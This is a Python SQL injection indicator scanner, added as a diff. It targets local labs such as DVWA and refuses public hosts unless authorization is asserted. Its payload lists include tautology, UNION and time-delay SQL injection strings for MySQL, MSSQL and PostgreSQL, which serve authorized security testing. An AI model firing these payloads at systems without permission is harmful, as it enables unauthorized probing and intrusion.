@@ -1,0 +1,487 @@
+#!/usr/bin/env python3
+"""
+SQLi Scanner - Authorized-target SQL injection indicator scanner.
+
+WARNING / LEGAL NOTICE
+-----------------------
+This tool sends crafted payloads to web application inputs (GET/POST params,
+headers, cookies) to detect indicators of SQL injection vulnerabilities.
+Only run it against systems you own or are explicitly authorized to test,
+such as a local DVWA / bWAPP / Juice Shop / OWASP WebGoat instance running
+on your own machine or lab network.
+
+Scanning systems you do not own or lack written authorization to test is
+illegal in most jurisdictions (e.g. under the US CFAA, UK Computer Misuse
+Act, and equivalents elsewhere) and this tool will refuse to run against
+targets it cannot confirm are local/private by default.
+
+Usage examples
+---------------
+  # Basic scan of a DVWA login form running locally
+  python sqli_scanner.py --url http://127.0.0.1/dvwa/vulnerabilities/sqli/ \\
+      --params id --method GET --cookie "PHPSESSID=xxx; security=low"
+
+  # Scan a POST form with two params, 5 workers, 2 req/sec rate limit
+  python sqli_scanner.py --url http://localhost:8080/login \\
+      --params username,password --method POST --workers 5 --rate 2
+
+  # Explicitly authorize a non-local target you have permission to test
+  python sqli_scanner.py --url http://staging.internal.example.com/search \\
+      --params q --i-have-authorization
+
+Output
+------
+Findings are written to:
+  - reports/scan_<timestamp>.json  (machine readable)
+  - reports/scan_<timestamp>.log   (human readable log, also on stdout)
+"""
+
+import argparse
+import concurrent.futures
+import ipaddress
+import json
+import logging
+import socket
+import sys
+import threading
+import time
+import urllib.parse
+from dataclasses import dataclass, field
+from datetime import datetime, timezone
+from pathlib import Path
+from typing import Optional
+
+import requests
+
+# --------------------------------------------------------------------------
+# Safety gate: only allow scanning of local / private / explicitly-approved
+# targets unless the user passes --i-have-authorization.
+# --------------------------------------------------------------------------
+
+PRIVATE_HOSTNAMES = {"localhost", "127.0.0.1", "::1", "0.0.0.0"}
+
+
+def resolve_and_check_authorized(url: str, force_authorized: bool) -> tuple[bool, str]:
+    """Returns (authorized, reason)."""
+    if force_authorized:
+        return True, "user explicitly asserted authorization (--i-have-authorization)"
+
+    host = urllib.parse.urlparse(url).hostname
+    if not host:
+        return False, "could not parse hostname from URL"
+
+    if host.lower() in PRIVATE_HOSTNAMES:
+        return True, "hostname is localhost"
+
+    try:
+        ip = ipaddress.ip_address(host)
+        if ip.is_private or ip.is_loopback:
+            return True, f"IP {ip} is private/loopback"
+        return False, f"IP {ip} is not private/loopback"
+    except ValueError:
+        pass  # host is a DNS name, not a literal IP
+
+    try:
+        resolved_ip = socket.gethostbyname(host)
+        ip = ipaddress.ip_address(resolved_ip)
+        if ip.is_private or ip.is_loopback:
+            return True, f"hostname resolves to private/loopback IP {ip}"
+        return False, f"hostname resolves to public IP {ip}"
+    except socket.gaierror:
+        return False, "hostname did not resolve"
+
+
+# --------------------------------------------------------------------------
+# Payloads and detection signatures
+# --------------------------------------------------------------------------
+
+ERROR_BASED_PAYLOADS = [
+    "'",
+    "\"",
+    "')",
+    "';",
+    "' OR '1'='1",
+    "' OR '1'='1' -- ",
+    "' OR 1=1 -- ",
+    "\" OR \"1\"=\"1",
+    "' AND '1'='2",
+    "1' ORDER BY 1000 -- ",
+    "' UNION SELECT NULL -- ",
+]
+
+# Payload pairs for boolean-based blind detection: (true_condition, false_condition)
+BOOLEAN_PAIRS = [
+    ("' OR '1'='1", "' OR '1'='2"),
+    ("1 OR 1=1", "1 OR 1=2"),
+    ("' OR 'a'='a", "' OR 'a'='b"),
+]
+
+# Time-based blind payloads with expected delay (seconds) per DB engine
+TIME_BASED_PAYLOADS = [
+    ("' OR SLEEP(5)-- ", 5, "MySQL"),
+    ("'; WAITFOR DELAY '0:0:5'-- ", 5, "MSSQL"),
+    ("' OR pg_sleep(5)-- ", 5, "PostgreSQL"),
+]
+
+SQL_ERROR_SIGNATURES = [
+    "you have an error in your sql syntax",
+    "warning: mysql",
+    "unclosed quotation mark",
+    "quoted string not properly terminated",
+    "sql syntax.*mysql",
+    "valid mysql result",
+    "mysqlclient.",
+    "pg_query()",
+    "pg_exec()",
+    "postgresql query failed",
+    "sqlite3.operationalerror",
+    "sqlite3::",
+    "microsoft ole db provider for sql server",
+    "unclosed quotation mark after the character string",
+    "odbc sql server driver",
+    "sqlserver jdbc driver",
+    "oracle error",
+    "ora-00933",
+    "ora-01756",
+    "supplied argument is not a valid mysql",
+    "syntax error",
+]
+
+
+@dataclass
+class Finding:
+    url: str
+    method: str
+    param: str
+    payload: str
+    technique: str  # error-based / boolean-based / time-based
+    evidence: str
+    status_code: int
+    elapsed: float
+    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
+
+
+# --------------------------------------------------------------------------
+# Simple token-bucket rate limiter shared across worker threads
+# --------------------------------------------------------------------------
+
+class RateLimiter:
+    def __init__(self, rate_per_sec: float):
+        self.min_interval = 1.0 / rate_per_sec if rate_per_sec > 0 else 0
+        self._lock = threading.Lock()
+        self._last = 0.0
+
+    def wait(self):
+        if self.min_interval <= 0:
+            return
+        with self._lock:
+            now = time.monotonic()
+            wait_time = self._last + self.min_interval - now
+            if wait_time > 0:
+                time.sleep(wait_time)
+            self._last = time.monotonic()
+
+
+# --------------------------------------------------------------------------
+# Scanner
+# --------------------------------------------------------------------------
+
+class SQLiScanner:
+    def __init__(
+        self,
+        base_url: str,
+        method: str,
+        params: list[str],
+        headers: dict,
+        workers: int,
+        rate_per_sec: float,
+        timeout: float,
+        logger: logging.Logger,
+    ):
+        self.base_url = base_url
+        self.method = method.upper()
+        self.params = params
+        self.headers = headers
+        self.timeout = timeout
+        self.logger = logger
+        self.rate_limiter = RateLimiter(rate_per_sec)
+        self.workers = workers
+        self.session = requests.Session()
+        self.findings: list[Finding] = []
+        self._lock = threading.Lock()
+
+    # -- HTTP helper -------------------------------------------------------
+
+    def _request(self, param_values: dict) -> Optional[requests.Response]:
+        self.rate_limiter.wait()
+        try:
+            start = time.monotonic()
+            if self.method == "GET":
+                resp = self.session.get(
+                    self.base_url,
+                    params=param_values,
+                    headers=self.headers,
+                    timeout=self.timeout,
+                )
+            else:
+                resp = self.session.post(
+                    self.base_url,
+                    data=param_values,
+                    headers=self.headers,
+                    timeout=self.timeout,
+                )
+            resp.elapsed_override = time.monotonic() - start
+            return resp
+        except requests.RequestException as exc:
+            self.logger.warning("Request error for %s: %s", param_values, exc)
+            return None
+
+    def _baseline_values(self) -> dict:
+        return {p: "1" for p in self.params}
+
+    # -- Detection techniques ----------------------------------------------
+
+    def _check_error_based(self, param: str):
+        base_values = self._baseline_values()
+        for payload in ERROR_BASED_PAYLOADS:
+            values = dict(base_values)
+            values[param] = payload
+            resp = self._request(values)
+            if resp is None:
+                continue
+            body_lower = resp.text.lower()
+            for sig in SQL_ERROR_SIGNATURES:
+                if sig in body_lower:
+                    self._record(
+                        param, payload, "error-based",
+                        f"response contained signature: '{sig}'",
+                        resp.status_code, getattr(resp, "elapsed_override", 0.0),
+                    )
+                    break
+
+    def _check_boolean_based(self, param: str):
+        base_values = self._baseline_values()
+        for true_payload, false_payload in BOOLEAN_PAIRS:
+            values_true = dict(base_values)
+            values_true[param] = true_payload
+            values_false = dict(base_values)
+            values_false[param] = false_payload
+
+            resp_true = self._request(values_true)
+            resp_false = self._request(values_false)
+            if resp_true is None or resp_false is None:
+                continue
+
+            len_true = len(resp_true.text)
+            len_false = len(resp_false.text)
+            status_diff = resp_true.status_code != resp_false.status_code
+            # Significant content-length divergence between true/false
+            # conditions is a classic boolean-blind SQLi indicator.
+            if status_diff or abs(len_true - len_false) > max(20, 0.1 * len_false):
+                self._record(
+                    param, f"TRUE='{true_payload}' vs FALSE='{false_payload}'",
+                    "boolean-based",
+                    f"response diverged: len(true)={len_true} len(false)={len_false} "
+                    f"status(true)={resp_true.status_code} status(false)={resp_false.status_code}",
+                    resp_true.status_code, getattr(resp_true, "elapsed_override", 0.0),
+                )
+
+    def _check_time_based(self, param: str):
+        base_values = self._baseline_values()
+        # establish a baseline response time first
+        baseline_resp = self._request(base_values)
+        baseline_time = getattr(baseline_resp, "elapsed_override", 0.5) if baseline_resp else 0.5
+
+        for payload, delay, engine in TIME_BASED_PAYLOADS:
+            values = dict(base_values)
+            values[param] = payload
+            resp = self._request(values)
+            if resp is None:
+                continue
+            elapsed = getattr(resp, "elapsed_override", 0.0)
+            if elapsed >= baseline_time + delay * 0.8:
+                self._record(
+                    param, payload, "time-based",
+                    f"response delayed {elapsed:.2f}s (baseline {baseline_time:.2f}s), "
+                    f"consistent with {engine} time-based injection",
+                    resp.status_code, elapsed,
+                )
+
+    def _record(self, param, payload, technique, evidence, status_code, elapsed):
+        finding = Finding(
+            url=self.base_url,
+            method=self.method,
+            param=param,
+            payload=payload,
+            technique=technique,
+            evidence=evidence,
+            status_code=status_code,
+            elapsed=elapsed,
+        )
+        with self._lock:
+            self.findings.append(finding)
+        self.logger.warning(
+            "[FINDING] param=%s technique=%s payload=%r evidence=%s",
+            param, technique, payload, evidence,
+        )
+
+    # -- Orchestration -------------------------------------------------------
+
+    def run(self):
+        tasks = []
+        for param in self.params:
+            tasks.append((self._check_error_based, param))
+            tasks.append((self._check_boolean_based, param))
+            tasks.append((self._check_time_based, param))
+
+        self.logger.info(
+            "Starting scan: %s %s params=%s workers=%d",
+            self.method, self.base_url, self.params, self.workers,
+        )
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.workers) as executor:
+            futures = [executor.submit(fn, param) for fn, param in tasks]
+            for fut in concurrent.futures.as_completed(futures):
+                exc = fut.exception()
+                if exc:
+                    self.logger.error("Task raised: %s", exc)
+
+        self.logger.info("Scan complete. %d finding(s).", len(self.findings))
+        return self.findings
+
+
+# --------------------------------------------------------------------------
+# Logging / reporting setup
+# --------------------------------------------------------------------------
+
+def setup_logging(report_dir: Path, timestamp: str) -> logging.Logger:
+    report_dir.mkdir(parents=True, exist_ok=True)
+    log_path = report_dir / f"scan_{timestamp}.log"
+
+    logger = logging.getLogger("sqli_scanner")
+    logger.setLevel(logging.DEBUG)
+    logger.handlers.clear()
+
+    fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
+
+    file_handler = logging.FileHandler(log_path)
+    file_handler.setFormatter(fmt)
+    file_handler.setLevel(logging.DEBUG)
+
+    console_handler = logging.StreamHandler(sys.stdout)
+    console_handler.setFormatter(fmt)
+    console_handler.setLevel(logging.INFO)
+
+    logger.addHandler(file_handler)
+    logger.addHandler(console_handler)
+    return logger
+
+
+def write_json_report(report_dir: Path, timestamp: str, findings: list[Finding], meta: dict):
+    report_path = report_dir / f"scan_{timestamp}.json"
+    payload = {
+        "meta": meta,
+        "findings": [f.__dict__ for f in findings],
+    }
+    report_path.write_text(json.dumps(payload, indent=2))
+    return report_path
+
+
+# --------------------------------------------------------------------------
+# CLI
+# --------------------------------------------------------------------------
+
+def parse_args():
+    parser = argparse.ArgumentParser(
+        description="SQLi indicator scanner for authorized targets only "
+                    "(DVWA, local labs, or explicitly authorized systems).",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=__doc__,
+    )
+    parser.add_argument("--url", required=True, help="Target URL (endpoint that accepts the params)")
+    parser.add_argument("--params", required=True, help="Comma-separated list of parameter names to test")
+    parser.add_argument("--method", default="GET", choices=["GET", "POST"], help="HTTP method (default: GET)")
+    parser.add_argument("--cookie", default=None, help="Cookie header string, e.g. 'PHPSESSID=xxx; security=low'")
+    parser.add_argument("--header", action="append", default=[], help="Extra header 'Name: value' (repeatable)")
+    parser.add_argument("--workers", type=int, default=4, help="Concurrent worker threads (default: 4)")
+    parser.add_argument("--rate", type=float, default=5.0, help="Max requests per second, shared across workers (default: 5)")
+    parser.add_argument("--timeout", type=float, default=10.0, help="Per-request timeout in seconds (default: 10)")
+    parser.add_argument("--report-dir", default="reports", help="Directory to write logs/reports (default: ./reports)")
+    parser.add_argument(
+        "--i-have-authorization",
+        action="store_true",
+        help="Assert you have explicit written authorization to test a non-local target. "
+             "Required for any target that is not localhost/private-network.",
+    )
+    return parser.parse_args()
+
+
+def build_headers(cookie: Optional[str], extra_headers: list[str]) -> dict:
+    headers = {"User-Agent": "sqli-scanner/1.0 (authorized-testing)"}
+    if cookie:
+        headers["Cookie"] = cookie
+    for h in extra_headers:
+        if ":" not in h:
+            continue
+        name, value = h.split(":", 1)
+        headers[name.strip()] = value.strip()
+    return headers
+
+
+def main():
+    args = parse_args()
+
+    authorized, reason = resolve_and_check_authorized(args.url, args.i_have_authorization)
+    if not authorized:
+        print(
+            f"REFUSING TO SCAN: target does not appear to be local/private ({reason}).\n"
+            f"This tool only scans localhost/private-network targets by default, "
+            f"such as a local DVWA/Juice Shop/WebGoat instance.\n"
+            f"If you have explicit written authorization to test this target, re-run with "
+            f"--i-have-authorization.",
+            file=sys.stderr,
+        )
+        sys.exit(1)
+
+    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
+    report_dir = Path(args.report_dir)
+    logger = setup_logging(report_dir, timestamp)
+    logger.info("Authorization check passed: %s", reason)
+
+    params = [p.strip() for p in args.params.split(",") if p.strip()]
+    headers = build_headers(args.cookie, args.header)
+
+    scanner = SQLiScanner(
+        base_url=args.url,
+        method=args.method,
+        params=params,
+        headers=headers,
+        workers=args.workers,
+        rate_per_sec=args.rate,
+        timeout=args.timeout,
+        logger=logger,
+    )
+
+    findings = scanner.run()
+
+    meta = {
+        "url": args.url,
+        "method": args.method,
+        "params": params,
+        "timestamp": timestamp,
+        "authorization_reason": reason,
+        "workers": args.workers,
+        "rate_per_sec": args.rate,
+    }
+    report_path = write_json_report(report_dir, timestamp, findings, meta)
+
+    print(f"\nReport written to: {report_path}")
+    if findings:
+        print(f"⚠️  {len(findings)} potential SQL injection indicator(s) found. Review the report for details.")
+    else:
+        print("No SQL injection indicators detected with the payloads used. "
+              "This does not guarantee the target is not vulnerable.")
+
+
+if __name__ == "__main__":
+    main()
